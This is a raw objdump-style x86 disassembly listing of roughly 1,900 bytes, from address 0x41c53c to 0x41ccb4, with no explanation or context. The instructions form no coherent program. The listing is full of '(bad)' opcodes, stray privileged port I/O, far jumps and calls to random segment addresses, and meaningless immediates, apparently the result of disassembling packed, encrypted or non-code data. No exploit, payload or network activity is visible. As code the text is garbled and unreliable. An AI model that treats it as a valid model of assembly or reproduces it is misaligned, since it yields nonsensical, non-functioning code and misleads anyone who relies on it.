  41c53c:	les    ebx,FWORD PTR [edi]
  41c53e:	daa    
  41c53f:	cld    
  41c540:	stos   DWORD PTR es:[edi],eax
  41c541:	mov    dh,0x6e
  41c543:	mov    eax,ds:0x3659e8cf
  41c548:	jb     0x41c4e6
  41c54a:	enter  0x48fc,0x4a
  41c54e:	aas    
  41c54f:	sahf   
  41c550:	push   ds
  41c551:	fsubr  DWORD PTR [esi-0x20]
  41c554:	lahf   
  41c555:	out    0x65,eax
  41c557:	ficomp WORD PTR [eax+0x2dbc13de]
  41c55d:	push   0xffffff98
  41c55f:	mov    edx,0x3f06fdc8
  41c564:	mov    ds:0x1ef700a3,al
  41c569:	loope  0x41c502
  41c56b:	or     DWORD PTR [edi],ebx
  41c56d:	mov    esi,0xeb0ffdb4
  41c572:	daa    
  41c573:	sar    DWORD PTR [eax+0x51],cl
  41c576:	push   ecx
  41c577:	(bad)  
  41c578:	shr    DWORD PTR [ecx+0x3f6a0b7],1
  41c57e:	mov    esp,0x97983edc
  41c583:	fnstcw WORD PTR [ebp+0x45]
  41c586:	inc    ebx
  41c587:	or     al,0xe5
  41c589:	mov    ah,0xeb
  41c58b:	loopne 0x41c5ef
  41c58d:	rcl    esp,0xd8
  41c590:	jb     0x41c52b
  41c592:	out    0x7,al
  41c594:	xor    BYTE PTR [ebx+0x43],0x8f
  41c598:	push   edx
  41c599:	pop    ecx
  41c59a:	mov    eax,ds:0x76e4e190
  41c59f:	adc    BYTE PTR [esi-0x1199e5a2],dl
  41c5a5:	xchg   ebp,eax
  41c5a6:	ret    
  41c5a7:	jp     0x41c55c
  41c5a9:	arpl   WORD PTR [esi-0x7cd18198],bx
  41c5af:	sbb    ch,dl
  41c5b1:	and    ah,BYTE PTR [esi-0x5f4907e4]
  41c5b7:	jbe    0x41c542
  41c5b9:	(bad)  
  41c5ba:	jmp    0xc84a86ec
  41c5bf:	sahf   
  41c5c0:	xchg   ebx,eax
  41c5c1:	fdiv   QWORD PTR [ebp-0x4a05e48e]
  41c5c7:	fdivr  DWORD PTR [ebx]
  41c5c9:	and    DWORD PTR [esi],esp
  41c5cb:	push   esi
  41c5cc:	xor    al,0x1f
  41c5ce:	xor    eax,0xef795337
  41c5d3:	mov    ds:0x41ecb6e8,eax
  41c5d8:	push   0xffffffd9
  41c5da:	add    bh,BYTE PTR [esi+0x14]
  41c5dd:	dec    ebx
  41c5de:	shl    BYTE PTR [ebp-0x49],0xa7
  41c5e2:	xlat   BYTE PTR ds:[ebx]
  41c5e3:	repnz out dx,al
  41c5e5:	or     DWORD PTR [ebp+eiz*1+0x4de009c3],0x4b9a82f7
  41c5f0:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41c5f2:	cmp    al,0x34
  41c5f4:	cmovnp edi,DWORD PTR [eax-0x14]
  41c5f8:	test   DWORD PTR [ecx-0xf],edx
  41c5fb:	sahf   
  41c5fc:	outs   dx,DWORD PTR ds:[esi]
  41c5fd:	adc    al,0x4
  41c5ff:	adc    esp,ebp
  41c601:	inc    ebp
  41c602:	push   es
  41c603:	and    ch,dl
  41c605:	sub    eax,0x142710f8
  41c60a:	mov    edi,0xe750e6be
  41c60f:	jb     0x41c5d6
  41c611:	stos   BYTE PTR es:[edi],al
  41c612:	xlat   BYTE PTR ds:[ebx]
  41c613:	enter  0xb428,0xf
  41c617:	or     eax,0x7ec58a78
  41c61c:	ds retf 
  41c61e:	popa   
  41c61f:	xchg   esp,eax
  41c620:	shr    DWORD PTR [esi+0x5035e97c],1
  41c626:	sub    ecx,ebx
  41c628:	or     bh,dl
  41c62a:	addr16 xchg ebp,eax
  41c62c:	imul   ecx,DWORD PTR gs:[eax-0xd],0x4a
  41c631:	repnz (bad) 
  41c633:	push   DWORD PTR fs:[ebp-0x591c7fdd]
  41c63a:	or     DWORD PTR [ecx+0x53],edx
  41c63d:	les    esi,FWORD PTR [eax+0x3d]
  41c640:	jecxz  0x41c682
  41c642:	mov    eax,0x62eb9369
  41c647:	scas   eax,DWORD PTR es:[edi]
  41c648:	ret    
  41c649:	test   dh,bl
  41c64b:	lahf   
  41c64c:	and    cl,cl
  41c64e:	mov    edx,0x11eb2c2d
  41c653:	mov    cl,dh
  41c655:	jge    0x41c6cb
  41c657:	sbb    BYTE PTR [esi+0x1f],cl
  41c65a:	sar    BYTE PTR [edx-0x6cdc690a],0x4e
  41c661:	jo     0x41c640
  41c663:	push   0xffffffa2
  41c665:	sbb    al,0xde
  41c667:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c668:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c669:	xchg   BYTE PTR ds:[edi+0x2c3d0ab9],al
  41c670:	cs inc edi
  41c672:	mov    bh,BYTE PTR gs:[ebp+eax*1-0x17]
  41c677:	jnp    0x41c6a6
  41c679:	cdq    
  41c67a:	mov    ah,bl
  41c67c:	inc    edx
  41c67d:	jns    0x41c6a8
  41c67f:	or     BYTE PTR [esi],cl
  41c681:	shl    BYTE PTR [ebx+eax*8+0x16],0x6b
  41c686:	dec    eax
  41c687:	int3   
  41c688:	xor    bh,BYTE PTR [ecx+0x31]
  41c68b:	dec    ebp
  41c68c:	adc    al,0x14
  41c68e:	test   BYTE PTR [ebx+0x35274af7],cl
  41c694:	sbb    ah,BYTE PTR [ebx+eiz*8]
  41c697:	cs aad 0x8a
  41c69a:	inc    eax
  41c69b:	nop
  41c69c:	and    ecx,DWORD PTR [edx+0x58]
  41c69f:	dec    esi
  41c6a0:	push   0x32
  41c6a2:	stc    
  41c6a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6a4:	mov    esi,0xd08d2409
  41c6a9:	cmp    eax,0xa2b72caf
  41c6ae:	jg     0x41c64d
  41c6b0:	and    eax,0xf2b69639
  41c6b5:	mov    ch,0x20
  41c6b7:	dec    ebp
  41c6b8:	push   ebx
  41c6b9:	popa   
  41c6ba:	mov    edi,0x67860cc0
  41c6bf:	pop    ss
  41c6c0:	sbb    eax,0x858c51fa
  41c6c5:	mov    eax,ds:0xd889ec62
  41c6cb:	daa    
  41c6cc:	ja     0x41c6fc
  41c6ce:	ins    BYTE PTR es:[edi],dx
  41c6cf:	(bad)  
  41c6d0:	scas   al,BYTE PTR es:[edi]
  41c6d1:	ja     0x41c737
  41c6d3:	lea    esi,[ebx-0x30]
  41c6d6:	mov    bh,0x7a
  41c6d8:	int    0x86
  41c6da:	retf   0x825a
  41c6dd:	xor    al,0xb4
  41c6df:	scas   eax,DWORD PTR es:[edi]
  41c6e0:	mov    dl,0x8
  41c6e2:	aaa    
  41c6e3:	in     eax,dx
  41c6e4:	cmp    al,BYTE PTR [ecx-0x21d2d00f]
  41c6ea:	popa   
  41c6eb:	xchg   esp,eax
  41c6ec:	(bad)  
  41c6ee:	xlat   BYTE PTR ds:[ebx]
  41c6ef:	pusha  
  41c6f0:	pop    eax
  41c6f1:	retf   
  41c6f2:	add    eax,0x11512e8c
  41c6f7:	mov    esp,0xf1b22b4
  41c6fc:	scas   al,BYTE PTR es:[edi]
  41c6fd:	pop    ds
  41c6fe:	scas   al,BYTE PTR es:[edi]
  41c6ff:	or     eax,0xf6e69d88
  41c704:	scas   al,BYTE PTR es:[edi]
  41c705:	push   eax
  41c706:	xchg   edx,eax
  41c707:	leave  
  41c708:	push   edi
  41c709:	out    0xb9,al
  41c70b:	pusha  
  41c70c:	sbb    al,dh
  41c70e:	loopne 0x41c73a
  41c710:	mov    al,0x2f
  41c712:	adc    eax,0xd23f0e4c
  41c717:	loop   0x41c790
  41c719:	sub    DWORD PTR [eax],0xffffff9f
  41c71c:	frstor ds:0xa195bd64
  41c722:	stc    
  41c723:	or     dh,BYTE PTR [edi+0x18a87fc3]
  41c729:	ror    BYTE PTR [edi+0x26c3a173],0xe5
  41c730:	inc    edx
  41c731:	xlat   BYTE PTR ds:[ebx]
  41c732:	sub    al,0x5b
  41c734:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c735:	loopne 0x41c787
  41c737:	div    DWORD PTR [eax+0x61]
  41c73a:	inc    ebp
  41c73b:	(bad)  
  41c73c:	std    
  41c73d:	rcr    bl,0x64
  41c740:	daa    
  41c741:	mov    fs,WORD PTR [ecx+0x66]
  41c744:	repz sbb bl,BYTE PTR [edx]
  41c747:	adc    ch,bl
  41c749:	add    bl,BYTE PTR [edx+0x4ea216a1]
  41c74f:	mov    dh,0xd3
  41c751:	fs loop 0x41c780
  41c754:	(bad)  [edx-0x2a]
  41c757:	or     al,0x6d
  41c759:	push   ecx
  41c75a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c75b:	mov    cl,0xbb
  41c75d:	test   eax,0x17705c3
  41c762:	pop    ecx
  41c763:	imul   esp,DWORD PTR [esi+0xd],0xb534ed7e
  41c76a:	mov    al,0xcf
  41c76c:	clc    
  41c76d:	gs push ebx
  41c76f:	mov    esi,edx
  41c771:	xor    BYTE PTR [ecx],cl
  41c773:	and    ebp,ebx
  41c775:	inc    ebx
  41c776:	jb     0x41c714
  41c778:	call   0xc25e:0x6879d426
  41c77f:	test   BYTE PTR [ebx],bl
  41c781:	scas   eax,DWORD PTR es:[edi]
  41c782:	push   ebx
  41c783:	mov    edi,0x903ea1a8
  41c788:	xor    al,BYTE PTR [ecx+ebx*4]
  41c78b:	(bad)  
  41c78c:	mov    DWORD PTR gs:[ebx+edi*1+0x7],edi
  41c791:	icebp  
  41c792:	adc    ebx,DWORD PTR [bp+di]
  41c795:	inc    ebp
  41c796:	xlat   BYTE PTR ds:[ebx]
  41c797:	fdiv   st(0),st
  41c799:	or     esi,DWORD PTR [esi-0x20]
  41c79c:	dec    esi
  41c79d:	call   0x682b9376
  41c7a2:	popf   
  41c7a3:	std    
  41c7a4:	fcomi  st,st(0)
  41c7a6:	sub    DWORD PTR [ebx+0x6c],eax
  41c7a9:	dec    edi
  41c7aa:	add    BYTE PTR [eax-0x76],0x5f
  41c7ae:	iret   
  41c7af:	fs push ebp
  41c7b1:	mov    WORD PTR [esi],ss
  41c7b3:	mov    eax,ds:0xb90ae871
  41c7b8:	rol    BYTE PTR [eax+0x6b],0xdb
  41c7bc:	jnp    0x41c747
  41c7be:	lods   al,BYTE PTR ds:[esi]
  41c7bf:	into   
  41c7c0:	ficom  WORD PTR [esi]
  41c7c2:	test   BYTE PTR [edx+0x30],ch
  41c7c5:	imul   esp,DWORD PTR [ebp+0x425cc819],0x7d
  41c7cc:	bound  ebp,QWORD PTR [edi-0x1b15e36a]
  41c7d2:	cmp    edi,ecx
  41c7d4:	push   ss
  41c7d5:	mov    edi,0xa11df320
  41c7da:	mov    ecx,0x4f859f4
  41c7df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c7e0:	cwde   
  41c7e1:	adc    al,0x32
  41c7e3:	inc    ecx
  41c7e4:	xor    BYTE PTR [ebx-0x38a43a02],ah
  41c7ea:	add    BYTE PTR [edx],ch
  41c7ec:	dec    ebx
  41c7ed:	mov    ds:0x702b3c98,eax
  41c7f2:	and    eax,0x882e4830
  41c7f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7f8:	inc    esi
  41c7f9:	dec    ebp
  41c7fa:	mul    BYTE PTR [eax]
  41c7fc:	lahf   
  41c7fd:	scas   eax,DWORD PTR es:[edi]
  41c7fe:	(bad)  
  41c800:	mov    ah,BYTE PTR [ebx-0x1a]
  41c803:	push   ds
  41c804:	into   
  41c805:	out    0xd9,al
  41c807:	adc    dl,BYTE PTR [edi+0x2b3e2e9b]
  41c80d:	and    eax,0x82f6132a
  41c812:	popa   
  41c813:	repz and edi,DWORD PTR [ecx+0x49]
  41c817:	enter  0x7992,0x7b
  41c81b:	psraw  mm6,QWORD PTR [eax+0x0]
  41c81f:	dec    eax
  41c820:	mov    ch,0x52
  41c822:	lea    eax,[ebx]
  41c824:	test   eax,0x95983cdb
  41c829:	ss stos BYTE PTR es:[edi],al
  41c82b:	sar    esi,cl
  41c82d:	imul   eax,DWORD PTR [edx-0x55],0xffffff83
  41c831:	xor    eax,0xfd763edf
  41c836:	dec    ebx
  41c837:	jmp    0xbf82:0xfd56fed4
  41c83e:	jnp    0x41c875
  41c840:	sub    bh,BYTE PTR [ecx+0x4ce68ede]
  41c846:	lods   al,BYTE PTR ds:[esi]
  41c847:	dec    ecx
  41c848:	cmp    esi,DWORD PTR [ebp+0x4f]
  41c84b:	dec    ebp
  41c84c:	and    al,BYTE PTR [esi-0x6a]
  41c84f:	cmp    BYTE PTR [esi],ah
  41c851:	outs   dx,DWORD PTR ds:[esi]
  41c852:	fistp  DWORD PTR [ecx-0x3439ecd7]
  41c858:	sti    
  41c859:	fisub  WORD PTR [esi+0x7d]
  41c85c:	lock inc ecx
  41c85e:	call   0xa1d838e1
  41c863:	and    BYTE PTR [ecx-0x7cc15766],bh
  41c869:	in     al,0xbb
  41c86b:	cdq    
  41c86c:	jae    0x41c81c
  41c86e:	pusha  
  41c86f:	mov    al,ds:0x4ca4594
  41c874:	outs   dx,BYTE PTR ds:[esi]
  41c875:	imul   ecx,DWORD PTR [edi+ebp*8+0x2d],0x1d
  41c87a:	scas   eax,DWORD PTR es:[edi]
  41c87b:	mov    ebx,0xc3093a28
  41c880:	daa    
  41c881:	cmp    ecx,ebp
  41c883:	ins    DWORD PTR es:[edi],dx
  41c884:	cmp    bl,al
  41c886:	ror    eax,0x47
  41c889:	push   esi
  41c88a:	add    DWORD PTR [edi+0x65],0x60
  41c88e:	jo     0x41c8a6
  41c890:	xchg   ebx,eax
  41c891:	cmp    ebp,DWORD PTR [edi+0xe]
  41c894:	xor    DWORD PTR ds:0x3b5b5178,0x170b03dc
  41c89e:	or     al,BYTE PTR [ebx-0x5b]
  41c8a1:	xchg   esi,eax
  41c8a2:	mov    al,0x8
  41c8a4:	cmp    BYTE PTR [esi],ch
  41c8a6:	jno    0x41c82e
  41c8a8:	xchg   DWORD PTR [ebx-0x6f],ebp
  41c8ab:	push   esi
  41c8ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8ad:	jg     0x41c883
  41c8af:	enter  0x948f,0x6a
  41c8b3:	push   esi
  41c8b4:	dec    ebx
  41c8b5:	jg     0x41c83a
  41c8b7:	aam    0x32
  41c8b9:	mov    bh,0x53
  41c8bb:	add    al,0x25
  41c8bd:	mov    eax,ebx
  41c8bf:	or     bh,BYTE PTR [edx]
  41c8c1:	and    bl,BYTE PTR [esi+0x7cff0602]
  41c8c7:	mov    al,0xd2
  41c8c9:	cs cs into 
  41c8cc:	cwde   
  41c8cd:	mov    al,ds:0xb422305e
  41c8d2:	icebp  
  41c8d3:	sbb    BYTE PTR [edx+0x44],bh
  41c8d6:	hlt    
  41c8d7:	repnz or DWORD PTR [esi],ecx
  41c8da:	sub    BYTE PTR [ebp-0xe],ch
  41c8dd:	cdq    
  41c8de:	push   ds
  41c8df:	and    al,0x15
  41c8e1:	(bad)  
  41c8e3:	test   al,0x2e
  41c8e5:	mov    edx,0x88cca734
  41c8ea:	in     eax,dx
  41c8eb:	mov    ebp,0x970becbe
  41c8f0:	rcl    bl,1
  41c8f2:	sti    
  41c8f3:	lods   eax,DWORD PTR ds:[esi]
  41c8f4:	fisttp QWORD PTR [edi+0xa949f3]
  41c8fa:	push   ebp
  41c8fb:	xchg   edi,eax
  41c8fc:	es cld 
  41c8fe:	push   esp
  41c8ff:	mov    bh,bl
  41c901:	(bad)  
  41c902:	in     eax,dx
  41c903:	mov    edx,0xc46ff6fa
  41c909:	mov    dh,0xae
  41c90b:	jp     0x41c8d1
  41c90d:	sub    eax,DWORD PTR [eax]
  41c90f:	sbb    DWORD PTR [ebp+0x4d37c3a6],0x50
  41c916:	xchg   ecx,eax
  41c917:	call   0xedf9:0x7bfce6e
  41c91e:	and    al,al
  41c920:	mov    ebx,0x41b948bb
  41c925:	test   al,0x1d
  41c927:	repz pop edx
  41c929:	ror    DWORD PTR [ecx],0xa5
  41c92c:	xor    cl,BYTE PTR es:[edx-0x1373f96f]
  41c933:	mov    fs,esp
  41c935:	rcl    DWORD PTR [esi+0x65],cl
  41c938:	imul   eax,DWORD PTR [esi-0xacfd7e8],0xd
  41c93f:	push   ss
  41c940:	mov    cl,0x8a
  41c942:	popf   
  41c943:	ins    BYTE PTR es:[edi],dx
  41c944:	(bad)  
  41c946:	(bad)  
  41c947:	fidiv  WORD PTR [eax+0x662e1d7e]
  41c94d:	es stos BYTE PTR es:[edi],al
  41c94f:	pop    esi
  41c950:	push   ebx
  41c951:	mov    dh,0x2b
  41c953:	rcl    DWORD PTR [ebp-0xc42ebec],0xdb
  41c95a:	(bad)  
  41c95b:	push   esp
  41c95c:	xchg   esp,eax
  41c95d:	das    
  41c95e:	outs   dx,BYTE PTR ds:[esi]
  41c95f:	ss in  al,0x3d
  41c962:	mov    eax,DWORD PTR [eax+edi*8]
  41c965:	call   0x6720e7b6
  41c96a:	sbb    cl,0x7f
  41c96d:	clc    
  41c96e:	stc    
  41c96f:	adc    ebp,DWORD PTR [eax]
  41c971:	mov    cl,0x27
  41c973:	mov    ch,0xe6
  41c975:	inc    BYTE PTR [eax+esi*1+0x20]
  41c979:	mov    edx,0x8a6fe6e7
  41c97e:	mov    dh,0x99
  41c980:	fbstp  TBYTE PTR [ebx]
  41c982:	cmp    esp,DWORD PTR [eax-0x7e]
  41c985:	stos   BYTE PTR es:[edi],al
  41c986:	fdiv   DWORD PTR ds:[eax+0x1f]
  41c98a:	ss xchg esp,eax
  41c98c:	popf   
  41c98d:	or     esi,edx
  41c98f:	in     al,dx
  41c990:	dec    eax
  41c991:	sub    DWORD PTR [esi],edx
  41c993:	mov    eax,0xb4e4592d
  41c998:	iret   
  41c999:	jb     0x41c98f
  41c99b:	sar    BYTE PTR [esi+0x18],1
  41c99e:	gs ins BYTE PTR es:[edi],dx
  41c9a0:	and    eax,0x38ee112c
  41c9a5:	loop   0x41c979
  41c9a7:	fimul  WORD PTR ds:0xa8b1996a
  41c9ad:	rol    BYTE PTR [edx-0x70362875],0x6e
  41c9b4:	(bad)  
  41c9b5:	and    edi,ebp
  41c9b7:	jecxz  0x41ca38
  41c9b9:	cmp    al,0xaa
  41c9bb:	dec    ecx
  41c9bc:	pusha  
  41c9bd:	jns    0x41c9cc
  41c9bf:	pop    esi
  41c9c0:	inc    edi
  41c9c1:	add    ebp,ecx
  41c9c3:	mov    ebx,0xf00720a8
  41c9c8:	xlat   BYTE PTR ds:[ebx]
  41c9c9:	not    ah
  41c9cb:	aad    0xd6
  41c9cd:	mov    edx,0xdc45ede2
  41c9d2:	sbb    BYTE PTR [edi+0x71],ah
  41c9d5:	ret    0xaf60
  41c9d8:	xor    DWORD PTR [ebp+0x51b2a392],eax
  41c9de:	mov    ch,0xbd
  41c9e0:	mov    esp,0x98fb6e3e
  41c9e5:	add    esp,DWORD PTR [edx+0x5749ca05]
  41c9eb:	dec    edx
  41c9ec:	pop    ecx
  41c9ed:	fs xor eax,0x17ddc1df
  41c9f3:	and    al,0xf0
  41c9f5:	fsubp  st(6),st
  41c9f7:	in     eax,0xeb
  41c9f9:	rol    ch,cl
  41c9fb:	mov    ss,WORD PTR [edx]
  41c9fd:	gs jle 0x41c997
  41ca00:	leave  
  41ca01:	imul   ebp,DWORD PTR ds:0xa672e5cc,0x83b18134
  41ca0b:	or     ebp,esp
  41ca0d:	add    al,0x9b
  41ca0f:	enter  0xa310,0xc2
  41ca13:	repz enter 0x685f,0x62
  41ca18:	ss sbb al,0x96
  41ca1b:	dec    ebp
  41ca1c:	sbb    dh,bh
  41ca1e:	add    al,0x59
  41ca20:	mov    bh,0x5c
  41ca22:	jnp    0x41c9e2
  41ca24:	daa    
  41ca25:	xor    eax,DWORD PTR [edx]
  41ca27:	mov    edx,0xd72002a
  41ca2c:	inc    esp
  41ca2d:	out    dx,al
  41ca2e:	add    al,dh
  41ca30:	int    0x64
  41ca32:	in     eax,0xc4
  41ca34:	call   0x19ff0c67
  41ca39:	push   eax
  41ca3a:	jmp    0x24dd:0x30e60a1b
  41ca41:	sub    dl,BYTE PTR [ecx+0x197b72be]
  41ca47:	(bad)
  41ca4b:	and    eax,0x2d9527f6
  41ca50:	sub    esi,DWORD PTR [ebx]
  41ca52:	(bad)  
  41ca53:	data16 setno BYTE PTR ds:[edx+0x8]
  41ca59:	or     al,0x17
  41ca5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca5c:	xor    BYTE PTR [ebp+0x8],dl
  41ca5f:	stc    
  41ca60:	gs or  al,0x2c
  41ca63:	adc    al,0x53
  41ca65:	sub    eax,0x973a3087
  41ca6a:	sbb    al,0xf5
  41ca6c:	and    al,ch
  41ca6e:	push   ss
  41ca6f:	mov    esi,0x56210761
  41ca74:	lahf   
  41ca75:	in     al,0xe9
  41ca77:	pop    si
  41ca79:	repz push ebx
  41ca7b:	aad    0x64
  41ca7d:	dec    eax
  41ca7e:	out    0xc8,eax
  41ca80:	mov    edx,0xe8597039
  41ca85:	sar    BYTE PTR [edi-0x6d],1
  41ca88:	pop    esi
  41ca89:	(bad)  
  41ca8a:	pop    bx
  41ca8c:	fnstsw WORD PTR [eax+0x7c]
  41ca8f:	call   FWORD PTR [ebx]
  41ca91:	ror    bh,0xdc
  41ca94:	data16 rcr BYTE PTR [esp+edi*8],1
  41ca98:	jge    0x41ca74
  41ca9a:	pop    edi
  41ca9b:	es imul ebx,edx,0xe
  41ca9f:	xlat   BYTE PTR ds:[ebx]
  41caa0:	imul   eax,DWORD PTR [ecx+esi*4-0x45],0x11ad47b8
  41caa8:	jge    0x41ca51
  41caaa:	aaa    
  41caab:	lea    sp,[eax+0x22473137]
  41cab2:	xchg   esp,eax
  41cab3:	ins    DWORD PTR es:[edi],dx
  41cab4:	rcr    DWORD PTR [eax-0x63],cl
  41cab7:	cmp    al,0x9c
  41cab9:	adc    edi,DWORD PTR [esi+0x68c275fe]
  41cabf:	dec    eax
  41cac0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cac1:	jno    0x41ca76
  41cac3:	jne    0x41caa7
  41cac5:	pop    edi
  41cac6:	fwait
  41cac7:	jmp    0x41ca5b
  41cac9:	call   0x32130ed5
  41cace:	leave  
  41cacf:	mov    cl,0x55
  41cad1:	jnp    0x41ca5f
  41cad3:	xchg   ebx,eax
  41cad4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cad5:	jp     0x41caf4
  41cad7:	or     BYTE PTR [eax-0x71],al
  41cada:	imul   esi,esp,0x5a
  41cadd:	sub    bl,BYTE PTR [edi+0x73cdc422]
  41cae3:	add    eax,0x5fdb2dbb
  41cae8:	jmp    0xea50:0x6313bb21
  41caef:	rol    DWORD PTR [edi],cl
  41caf1:	xor    DWORD PTR [ebx+0x3d],eax
  41caf4:	les    ecx,FWORD PTR [eax+0x3c]
  41caf7:	and    DWORD PTR [edx],ecx
  41caf9:	mov    cl,0x26
  41cafb:	pop    esi
  41cafc:	fnstcw WORD PTR [edi*4-0x40a124cc]
  41cb03:	xchg   ebx,eax
  41cb04:	fwait
  41cb05:	jecxz  0x41cad3
  41cb07:	arpl   WORD PTR [ecx-0xac472e6],bp
  41cb0d:	jbe    0x41cb08
  41cb0f:	sbb    eax,0x79d91d9d
  41cb14:	aam    0x26
  41cb16:	inc    edx
  41cb17:	mov    DWORD PTR [ecx+ebp*4+0x4f1912ec],eax
  41cb1e:	mov    bl,0x4f
  41cb20:	(bad)  
  41cb21:	xchg   edx,eax
  41cb22:	xchg   edi,eax
  41cb23:	dec    esi
  41cb24:	fisub  WORD PTR [esi]
  41cb26:	add    al,0x6e
  41cb28:	xchg   ecx,eax
  41cb29:	nop
  41cb2a:	push   cs
  41cb2b:	and    eax,0x40
  41cb2e:	inc    esi
  41cb2f:	adc    eax,0xdbd396a6
  41cb34:	hlt    
  41cb35:	(bad)  
  41cb36:	fst    DWORD PTR [esi+0x65]
  41cb39:	add    eax,0xd93bcc9c
  41cb3e:	out    0xa1,eax
  41cb40:	lods   eax,DWORD PTR ds:[esi]
  41cb41:	mov    edx,0xaaa3f3aa
  41cb46:	cs pop es
  41cb48:	or     edi,DWORD PTR [ebx+0x7d8f096a]
  41cb4e:	push   ss
  41cb4f:	sbb    al,0x48
  41cb51:	rol    BYTE PTR [ecx],cl
  41cb53:	std    
  41cb54:	xor    esp,DWORD PTR [edi-0xe]
  41cb57:	or     bh,BYTE PTR [esi-0x76]
  41cb5a:	ins    DWORD PTR es:[edi],dx
  41cb5b:	mov    dl,0x15
  41cb5d:	addr16 ffree st(3)
  41cb60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb61:	jle    0x41cbc4
  41cb63:	mov    dh,0x8b
  41cb65:	cmc    
  41cb66:	dec    ecx
  41cb67:	add    edi,DWORD PTR [ecx+0x7c5e1e43]
  41cb6d:	ds aas 
  41cb6f:	pop    ebx
  41cb70:	push   edx
  41cb71:	push   ebx
  41cb72:	mov    eax,0x6420936d
  41cb77:	daa    
  41cb78:	enter  0x5a19,0xc5
  41cb7c:	inc    esp
  41cb7d:	xchg   ebx,eax
  41cb7e:	std    
  41cb7f:	out    dx,eax
  41cb80:	or     eax,0x1c7b0c6c
  41cb85:	adc    BYTE PTR [eax-0x5c6d0edc],ah
  41cb8b:	mov    esp,0x8eee025a
  41cb90:	fmul   DWORD PTR [eax+edi*8+0x53]
  41cb94:	lahf   
  41cb95:	jae    0x41cb2a
  41cb97:	or     al,0xc5
  41cb99:	(bad)  
  41cb9a:	mov    eax,ds:0xe58ec942
  41cb9f:	inc    ebx
  41cba0:	jl     0x41cb33
  41cba2:	adc    eax,0x98447dd6
  41cba7:	and    ecx,DWORD PTR [edi-0x3dcf61a9]
  41cbad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbaf:	arpl   bx,ax
  41cbb1:	dec    edi
  41cbb2:	scas   al,BYTE PTR es:[edi]
  41cbb3:	and    DWORD PTR ds:0x6468703d,0xb84ba1cd
  41cbbd:	or     ebx,ecx
  41cbbf:	dec    edx
  41cbc0:	mov    dh,0xbf
  41cbc2:	or     bl,BYTE PTR [ebp-0x1d540418]
  41cbc8:	and    ebp,DWORD PTR [edx]
  41cbca:	lods   al,BYTE PTR ds:[esi]
  41cbcb:	mov    eax,ds:0xcdc3f5c
  41cbd0:	mov    ch,0x89
  41cbd2:	jl     0x41cc4a
  41cbd4:	jmp    0x41cb6d
  41cbd6:	push   ss
  41cbd7:	and    bh,BYTE PTR [ecx]
  41cbd9:	mov    eax,ds:0xed7a0928
  41cbde:	push   esp
  41cbdf:	das    
  41cbe0:	mov    eax,0x7e231656
  41cbe5:	sbb    BYTE PTR [ebp-0x228675c6],dl
  41cbeb:	stc    
  41cbec:	add    al,0x7c
  41cbee:	lods   al,BYTE PTR ds:[esi]
  41cbef:	nop
  41cbf0:	ds test esp,esp
  41cbf3:	and    esp,edi
  41cbf5:	ror    DWORD PTR [ebx-0x5b0677bf],cl
  41cbfb:	mul    BYTE PTR ds:0xdfdae753
  41cc01:	push   esi
  41cc02:	mov    edi,0xd7105a42
  41cc07:	dec    ebx
  41cc08:	sbb    BYTE PTR [esi-0x2d],bh
  41cc0b:	or     edx,0x11
  41cc0e:	or     eax,0x31d99728
  41cc13:	test   DWORD PTR [ebx+0x55d2222c],ecx
  41cc19:	rcr    DWORD PTR [ecx],0x4f
  41cc1c:	ror    DWORD PTR [ebp+0x28006a2c],1
  41cc22:	push   ss
  41cc23:	mov    dh,0x35
  41cc25:	or     BYTE PTR [esi],0xa8
  41cc28:	sub    DWORD PTR [esi-0x64],ebx
  41cc2b:	pop    eax
  41cc2c:	imul   edi,DWORD PTR [esi+0x3f666c89],0xdebd4088
  41cc36:	pop    esp
  41cc38:	jno    0x41cbec
  41cc3a:	jns    0x41cbed
  41cc3c:	or     BYTE PTR [edx],cl
  41cc3e:	int    0x67
  41cc40:	bound  edi,QWORD PTR [eax]
  41cc42:	scas   eax,DWORD PTR es:[edi]
  41cc43:	inc    esp
  41cc44:	cwde   
  41cc45:	push   0x9f6f8cff
  41cc4a:	or     al,0xe
  41cc4c:	xlat   BYTE PTR ds:[ebx]
  41cc4d:	sbb    edx,DWORD PTR [ebx]
  41cc4f:	ret    0xede5
  41cc52:	js     0x41cc19
  41cc54:	push   esp
  41cc55:	aad    0x9
  41cc57:	clc    
  41cc58:	popa   
  41cc59:	pop    ecx
  41cc5a:	cmp    eax,0x671d4f59
  41cc5f:	jns    0x41cc4c
  41cc61:	fs sub eax,0x4fcf3eb
  41cc67:	sbb    al,0x87
  41cc69:	(bad)  
  41cc6a:	jmp    0xb940e339
  41cc6f:	cmp    al,0xb2
  41cc71:	pop    esi
  41cc72:	aas    
  41cc73:	sbb    ax,0x9963
  41cc77:	(bad)
  41cc7a:	pusha  
  41cc7b:	adc    ecx,DWORD PTR [edx+0x7f]
  41cc7e:	mov    BYTE PTR [edx-0x270bcb7],0x88
  41cc85:	jnp    0x41cc7b
  41cc87:	dec    ecx
  41cc88:	stc    
  41cc89:	xor    edx,eax
  41cc8b:	xchg   esp,eax
  41cc8c:	fstp   DWORD PTR ds:0x8ff5c5de
  41cc92:	sbb    eax,0x3e5d54e
  41cc97:	daa    
  41cc98:	loopne 0x41ccdc
  41cc9a:	push   eax
  41cc9b:	shr    DWORD PTR [eax+0x7fde704d],0x68
  41cca2:	shr    DWORD PTR [edi],1
  41cca4:	dec    ebx
  41cca5:	cmp    ebp,DWORD PTR ds:0x74e7eeba
  41ccab:	rol    DWORD PTR [eax-0x3c2c140],1
  41ccb1:	or     dl,al
  41ccb3:	(bad)  
  41ccb4:	test   al,0x2c
